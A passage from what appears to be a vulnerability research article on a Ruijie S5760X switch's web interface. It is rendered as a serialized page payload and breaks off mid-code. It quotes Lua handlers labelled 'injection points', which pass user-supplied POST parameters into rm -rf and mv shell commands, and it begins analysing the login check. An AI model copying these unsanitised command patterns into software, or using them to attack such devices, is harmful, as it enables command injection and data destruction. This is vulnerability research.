\",[\"$\",\"span\",\"span-28\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-29\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" \",[\"$\",\"span\",\"span-30\",{\"className\":\"hljs-built_in\",\"children\":\"path\"}],\" = params[\",[\"$\",\"span\",\"span-31\",{\"className\":\"hljs-string\",\"children\":\"\\\"path\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-32\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(\",[\"$\",\"span\",\"span-33\",{\"className\":\"hljs-built_in\",\"children\":\"string\"}],\".\",[\"$\",\"span\",\"span-34\",{\"className\":\"hljs-built_in\",\"children\":\"find\"}],\"(\",[\"$\",\"span\",\"span-35\",{\"className\":\"hljs-built_in\",\"children\":\"path\"}],\",\",[\"$\",\"span\",\"span-36\",{\"className\":\"hljs-string\",\"children\":\"\\\"%.%.\\\"\"}],\")) \",[\"$\",\"span\",\"span-37\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\" \",[\"$\",\"span\",\"span-38\",{\"className\":\"hljs-comment\",\"children\":\"-- Block path traversal.\"}],\"\\n        errorPages.forward403() ;\\n        \",[\"$\",\"span\",\"span-39\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\";\\n    \",[\"$\",\"span\",\"span-40\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n    \",[\"$\",\"span\",\"span-41\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-42\",{\"className\":\"hljs-string\",\"children\":\"'rm -rf '\"}],\"..\",[\"$\",\"span\",\"span-43\",{\"className\":\"hljs-built_in\",\"children\":\"path\"}],\"..\",[\"$\",\"span\",\"span-44\",{\"className\":\"hljs-string\",\"children\":\"'/*.pcap'\"}],\";\\n    \",[\"$\",\"span\",\"span-45\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" rest = Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-46\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n\",[\"$\",\"span\",\"span-47\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\\n\",\"$L50\",\" M;\\n\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"29:[\"$\",\"p\",\"p-10\",{\"children\":\"Injection point five:\"}]\n"])</script><script>self.__next_f.push([1,"2a:[\"$\",\"$L12\",\"pre-6\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[\"routers/common/system/platform.lua\\n\",[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.moveFile\"}],\" \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\" \\n    \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" src_tmp = params[\",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-string\",\"children\":\"\\\"src\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" dest_tmp = params[\",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-string\",\"children\":\"\\\"dest\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd =\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-string\",\"children\":\"\\\"mv -f \\\"\"}],\" ..\",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-string\",\"children\":\"\\\"'/data/.rgos/vsd/0/oam/\\\"\"}],\".. src_tmp ..\",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\".. \",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-string\",\"children\":\"\\\" '/data/.rgos/vsd/0/oam/\\\"\"}],\" .. dest_tmp ..\",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\";\\n    ret.data = Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n\",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"2b:[\"$\",\"p\",\"p-11\",{\"children\":\"Injection point six:\"}]\n"])</script><script>self.__next_f.push([1,"2c:[\"$\",\"$L12\",\"pre-7\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.moveZip\"}],\" \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\" \\n    \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" src_tmp = params[\",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-string\",\"children\":\"\\\"src\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" dest_tmp = params[\",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-string\",\"children\":\"\\\"dest\\\"\"}],\"];\\n      \",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-comment\",\"children\":\"-- Delete only files with a .zip suffix.\"}],\"\\n    \",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\"  tmp= \",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-built_in\",\"children\":\"string\"}],\".\",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-built_in\",\"children\":\"match\"}],\"(src_tmp,\",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-string\",\"children\":\"\\\"%.zip$\\\"\"}],\",\",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-number\",\"children\":\"1\"}],\",\",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-literal\",\"children\":\"true\"}],\");\\n    \",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (tmp ~= \",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-literal\",\"children\":\"nil\"}],\") \",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n        \",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd =\",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-string\",\"children\":\"\\\"mv -f \\\"\"}],\" ..\",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\".. src_tmp ..\",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\".. \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-string\",\"children\":\"\\\" '\\\"\"}],\" .. dest_tmp ..\",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\";\\n        ret.data = Utils.IoUtil.execShell(cmd);\\n        \",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n    \",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"2d:[\"$\",\"p\",\"p-12\",{\"children\":\"Injection point seven:\"}]\n"])</script><script>self.__next_f.push([1,"2e:[\"$\",\"$L12\",\"pre-8\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.delSumFile\"}],\" \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\" \\n    \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" src_tmp = params[\",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-string\",\"children\":\"\\\"src\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-comment\",\"children\":\"-- Delete only when the path matches this directory.\"}],\"\\n    \",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\"  tmp= \",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-built_in\",\"children\":\"string\"}],\".\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-built_in\",\"children\":\"match\"}],\"(src_tmp,\",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-string\",\"children\":\"\\\"/tmp/vsd/0/security/sumng/\\\"\"}],\");\\n    \",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (tmp ~= \",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-literal\",\"children\":\"nil\"}],\") \",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n    \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-string\",\"children\":\"\\\"rm -rf \\\"\"}],\" ..\",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\".. src_tmp..\",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\";\\n    Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n    \",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"2f:[\"$\",\"p\",\"p-13\",{\"children\":\"Injection point eight:\"}]\n30:[\"$\",\"$L12\",\"pre-9\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.delOamFile\"}],\" \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\" \\n    \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" src_tmp = params[\",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-string\",\"children\":\"\\\"src\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-string\",\"children\":\"\\\"rm -rf \\\"\"}],\" ..\",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-string\",\"children\":\"\\\"'/data/.rgos/vsd/0/oam/\\\"\"}],\".. src_tmp..\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\";\\n    Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n\",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\"]}]}]\n31:[\"$\",\"p\",\"p-14\",{\"children\":\"Injection point nine:\"}]\n32:[\"$\",\"$L12\",\"pre-10\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.delZip\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\" \\n    \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" src_tmp = params[\",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-string\",\"children\":\"\\\"src\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-string\",\"children\":\"\\\"rm -rf \\\"\"}],\" ..\",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-string\",\"children\":\"\\\"'/data/\\\"\"}],\".. src_tmp..\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\";\\n    Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n\",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\"]}]}]\n33:[\"$\",\"p\",\"p-15\",{\"children\":\"Injection point ten:\"}]\n34:[\"$\",\"$L12\",\"pre-11\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.delTmp\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\" \\n    \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-string\",\"children\":\"\\\"rm -rf /data/portal/zip/tmp/\\\"\"}],\";\\n    Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n\",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\"]}]}]\n35:[\"$\",\"p\",\"p-16\",{\"children\":\"Injection point eleven:\"}]\n"])</script><script>self.__next_f.push([1,"36:[\"$\",\"$L12\",\"pre-12\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(\",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"not\"}],\" GLOBAL_IN) \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"  \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\";   \",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cgilua = \",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-string\",\"children\":\"\\\"cgilua\\\"\"}],\")\\n\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Page = \",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.page\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" \",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\" = \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.logger\\\"\"}],\").\",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\";\\n\",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Utils = \",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.utils\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" M = \",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-built_in\",\"children\":\"setmetatable\"}],\"({},{ \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-built_in\",\"children\":\"__index\"}],\" = Page }) ;\\n\",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" reloadDao = \",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.routers.common.admin.admin\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-comment\",\"children\":\"-- Extract the device's web.gz package.\"}],\"\\n\",[\"$\",\"span\",\"span-26\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.unZipWeb\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\"\\n    \",[\"$\",\"span\",\"span-27\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-28\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\",[\"$\",\"span\",\"span-29\",{\"className\":\"hljs-comment\",\"children\":\"-- Parameters supplied by JavaScript.\"}],\"\\n    \",[\"$\",\"span\",\"span-30\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" filname = params.filename;\\n    \",[\"$\",\"span\",\"span-31\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-32\",{\"className\":\"hljs-string\",\"children\":\"'rm -rf /var/web.gz\\\\nmv /tmp/vsd/0/oam/httpd/'\"}],\"..filname..\",[\"$\",\"span\",\"span-33\",{\"className\":\"hljs-string\",\"children\":\"' /var/web.gz\\\\nrm -rf /tmp/html\\\\n/sbin/web.gz.sh\\\\nsync'\"}],\";\\n    \",[\"$\",\"span\",\"span-34\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(params.isSwitch) \",[\"$\",\"span\",\"span-35\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n        cmd = \",[\"$\",\"span\",\"span-36\",{\"className\":\"hljs-string\",\"children\":\"'rm -rf /sbin/web.gz\\\\nmv /tmp/vsd/0/oam/httpd/'\"}],\"..filname..\",[\"$\",\"span\",\"span-37\",{\"className\":\"hljs-string\",\"children\":\"' /sbin/web.gz\\\\nrm -rf /tmp/html\\\\n/sbin/web.gz.sh\\\\nsync'\"}],\";\\n    \",[\"$\",\"span\",\"span-38\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n    \",[\"$\",\"span\",\"span-39\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" rest = Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-40\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" count = \",[\"$\",\"span\",\"span-41\",{\"className\":\"hljs-number\",\"children\":\"0\"}],\";\\n    \",[\"$\",\"span\",\"span-42\",{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" k,v \",[\"$\",\"span\",\"span-43\",{\"className\":\"hljs-keyword\",\"children\":\"in\"}],\" \",[\"$\",\"span\",\"span-44\",{\"className\":\"hljs-built_in\",\"children\":\"pairs\"}],\"(rest) \",\"$L51\",\" \\n        count = count + \",\"$L52\",\"\\n    \",\"$L53\",\"\\n    ret.code = count\\n    \\n    \",\"$L54\",\".jsonOutPut(ret);\\n\",\"$L55\",\"\\n\\n\",\"$L56\",\"\\n    reloadDao:reload(\",\"$L57\",\")\\n\",\"$L58\",\"\\n\\n\",\"$L59\",\" M;\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"37:[\"$\",\"h3\",\"h3-1\",{\"children\":\"auth analysis\"}]\n38:[\"$\",\"div\",\"p-17\",{\"className\":\"article-image-row\",\"children\":[\"These issues require authentication. To assess whether that boundary could be bypassed, I followed string references to the \",[\"$\",\"code\",\"code-0\",{\"children\":\"httpd\"}],\" binary.\\nThe login request led to the \",[\"$\",\"code\",\"code-1\",{\"children\":\"auth\"}],\" string.\\n\",[\"$\",\"figure\",\"img-0\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/11.png\",\"width\":1918,\"height\":850,\"style\":{\"width\":1918,\"aspectRatio\":\"1918 / 850\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}],\"\\nThe Lua authentication flow is:\"]}]\n"])</script><script>self.__next_f.push([1,"39:[\"$\",\"$L12\",\"pre-13\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[\"web/routers/init.lua -\u003e web/lib/page.lua\\n\",[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-comment\",\"children\":\"-- Pre-action handler: authentication, session setup, and related operations.\"}],\"\\n\",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.beforeAction\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self, controller)\"}]]}],\"\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".auth) \",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n        \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-comment\",\"children\":\"--[[session.open()+\\n         local sessData = session.getSessionData()\\n         if(not sessData.username) then\\n              return false\\n         end]]\"}],\"\\n        \",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-comment\",\"children\":\"-- unauthenticate.unauthenticate.lua can be accessed without login.\"}],\"\\n        \",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(controller == \",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-string\",\"children\":\"\\\"unauthenticate.unauthenticate\\\"\"}],\") \",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n            \",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-literal\",\"children\":\"true\"}],\";\\n        \",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n        M.currentUser = cgilua.servervariable(\",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-string\",\"children\":\"\\\"WEBMASTER_USER\\\"\"}],\") \",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-keyword\",\"children\":\"or\"}],\" \",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-string\",\"children\":\"\\\"\\\"\"}],\";\\n        \",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (M.currentUser == \",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-string\",\"children\":\"\\\"\\\"\"}],\") \",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n            \",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-number\",\"children\":\"1\"}],\";\\n        \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n        \",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" list = Utils.StringUtil.split(controller, \",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-string\",\"children\":\"\\\"%.\\\"\"}],\");\\n        \",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" id = list[\",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-built_in\",\"children\":\"table\"}],\".\",[\"$\",\"span\",\"span-26\",{\"className\":\"hljs-built_in\",\"children\":\"maxn\"}],\"(list)];\\n        \",[\"$\",\"span\",\"span-27\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" permission_user = permission_id[M.currentUser];\\n        \",[\"$\",\"span\",\"span-28\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (M.currentUser ~= \",[\"$\",\"span\",\"span-29\",{\"className\":\"hljs-string\",\"children\":\"\\\"admin\\\"\"}],\" \",[\"$\",\"span\",\"span-30\",{\"className\":\"hljs-keyword\",\"children\":\"and\"}],\" (permission_onlyAdmin[id] \",[\"$\",\"span\",\"span-31\",{\"className\":\"hljs-keyword\",\"children\":\"or\"}],\" \",[\"$\",\"span\",\"span-32\",{\"className\":\"hljs-keyword\",\"children\":\"not\"}],\" permission_user)) \",[\"$\",\"span\",\"span-33\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\" \",[\"$\",\"span\",\"span-34\",{\"className\":\"hljs-comment\",\"children\":\"-- No administrator privileges, or no configured page access.\"}],\"\\n            \",[\"$\",\"span\",\"span-35\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",\"span-36\",{\"className\":\"hljs-number\",\"children\":\"2\"}],\";\\n        \",[\"$\",\"span\",\"span-37\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n        \",[\"$\",\"span\",\"span-38\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",\"span-39\",{\"className\":\"hljs-keyword\",\"children\":\"not\"}],\" permission_map[id] \",[\"$\",\"span\",\"span-40\",{\"className\":\"hljs-keyword\",\"children\":\"or\"}],\" permission_user==\",\"$L5a\",\" \",\"$L5b\",\"  M.currentUser == \",\"$L5c\",\") \",\"$L5d\",\"\\n            \",\"$L5e\",\" \",\"$L5f\",\"\\n        \",\"$L60\",\"\\n        \",\"$L61\",\" (\",\"$L62\",\"(permission_map[id])==\",\"$L63\",\" 